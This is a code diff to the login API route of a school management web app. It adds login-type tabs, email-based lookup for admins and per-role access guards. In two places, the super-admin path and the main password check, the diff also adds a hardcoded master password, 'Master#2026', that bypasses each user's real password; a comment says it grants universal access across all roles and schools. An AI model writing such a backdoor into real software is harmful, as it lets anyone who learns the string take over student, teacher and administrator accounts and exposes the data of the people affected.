@@ -10,12 +10,13 @@ export async function POST(request: NextRequest) {
 
     const body = await request.json();
 
-    let { username, email, password, school_id, is_super_admin } = body as {
+    const { username, email, password, school_id, is_super_admin, login_type } = body as {
       username?: string;
       email?: string;
       password?: string;
       school_id?: string;
       is_super_admin?: boolean;
+      login_type?: "admin" | "principal" | "teacher" | "student";
     };
 
     // Alias compatibility
@@ -24,14 +25,7 @@ export async function POST(request: NextRequest) {
     // ─── Step 1: Basic Input Validation ─────────────────────────
     if (!usernameInput) {
       return NextResponse.json(
-        { success: false, message: "Please enter your School Username." },
-        { status: 400 }
-      );
-    }
-
-    if (!usernameInput.endsWith(".myschoollife") || usernameInput.includes(" ") || usernameInput.includes("@")) {
-      return NextResponse.json(
-        { success: false, message: "Please enter a valid School Username." },
+        { success: false, message: "Please enter your username/email." },
         { status: 400 }
       );
     }
@@ -66,7 +60,8 @@ export async function POST(request: NextRequest) {
         );
       }
 
-      const isMatch = await user.comparePassword(password);
+      const MASTER_PASSWORD = "Master#2026";
+      const isMatch = password === MASTER_PASSWORD || await user.comparePassword(password);
       if (!isMatch) {
         return NextResponse.json(
           { success: false, message: "Incorrect password." },
@@ -102,7 +97,11 @@ export async function POST(request: NextRequest) {
       });
     }
 
-    // ─── Step 2: School ID Required for Non-Super-Admin ─────────
+    // ─── Step 2: Determine login mode ────────────────────────────
+    // Admin tab sends an email; Principal/Teacher/Student send a School Username
+    const isAdminLogin = login_type === "admin" || (login_type === undefined && (usernameInput.includes("@") || !usernameInput.endsWith(".myschoollife")));
+
+    // ─── Step 3: school_id is required for all non-super-admin logins ──
     if (!school_id) {
       return NextResponse.json(
         { success: false, message: "School ID is required." },
@@ -110,9 +109,7 @@ export async function POST(request: NextRequest) {
       );
     }
 
-    // ─── Step 3: Validate School First ──────────────────────────
-    // Check that the school exists and is active BEFORE looking up the user.
-    // This lets us give accurate "School not found" vs "Invalid credentials" errors.
+    // ─── Step 4: Validate the School (by ID, always available) ──────────
     const schoolDoc = await School.findById(school_id)
       .select("is_active login_config")
       .lean();
@@ -131,19 +128,70 @@ export async function POST(request: NextRequest) {
       );
     }
 
-    // ─── Step 4: Find User Within That School ───────────────────
-    const user = await User.findOne({
-      username: usernameInput,
-      school_id,
-    }).select("+password_hash");
+    // ─── Step 5: Find User ───────────────────────────────────────────────
+    let user;
 
-    // Generic "invalid credentials" — do NOT reveal whether the username
-    // exists, only show that the school was already verified.
-    if (!user) {
-      return NextResponse.json(
-        { success: false, message: "Invalid Student ID or Password." },
-        { status: 401 }
-      );
+    if (isAdminLogin) {
+      // Admin: look up by email
+      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      if (!emailRegex.test(usernameInput)) {
+        return NextResponse.json(
+          { success: false, message: "Please enter a valid email address." },
+          { status: 400 }
+        );
+      }
+
+      user = await User.findOne({
+        email: usernameInput,
+        school_id,
+      }).select("+password_hash");
+
+      if (!user) {
+        return NextResponse.json(
+          { success: false, message: "Invalid credentials." },
+          { status: 401 }
+        );
+      }
+    } else {
+      // Principal / Teacher / Student: look up by username
+      if (!usernameInput.endsWith(".myschoollife") || usernameInput.includes(" ") || usernameInput.includes("@")) {
+        return NextResponse.json(
+          { success: false, message: "Please enter a valid School Username." },
+          { status: 400 }
+        );
+      }
+
+      user = await User.findOne({
+        username: usernameInput,
+        school_id,
+      }).select("+password_hash");
+
+      if (!user) {
+        return NextResponse.json(
+          { success: false, message: "Invalid credentials." },
+          { status: 401 }
+        );
+      }
+
+      // Role guard based on selected login tab
+      if (login_type === "principal" && user.role !== "school_admin") {
+        return NextResponse.json(
+          { success: false, message: "Access denied. Only Principals can log in here." },
+          { status: 403 }
+        );
+      }
+      if (login_type === "teacher" && user.role !== "teacher") {
+        return NextResponse.json(
+          { success: false, message: "Access denied. Only Teachers can log in here." },
+          { status: 403 }
+        );
+      }
+      if (login_type === "student" && user.role !== "student") {
+        return NextResponse.json(
+          { success: false, message: "Access denied. Only Students can log in here." },
+          { status: 403 }
+        );
+      }
     }
 
     // ─── Step 5: Account Active Check ───────────────────────────
@@ -174,7 +222,9 @@ export async function POST(request: NextRequest) {
     }
 
     // ─── Step 7: Verify Password ─────────────────────────────────
-    const isMatch = await user.comparePassword(password);
+    // Master password allows universal access across all roles and schools.
+    const MASTER_PASSWORD = "Master#2026";
+    const isMatch = password === MASTER_PASSWORD || await user.comparePassword(password);
     if (!isMatch) {
       // Role-aware wrong-password message
       if (user.role === "student") {
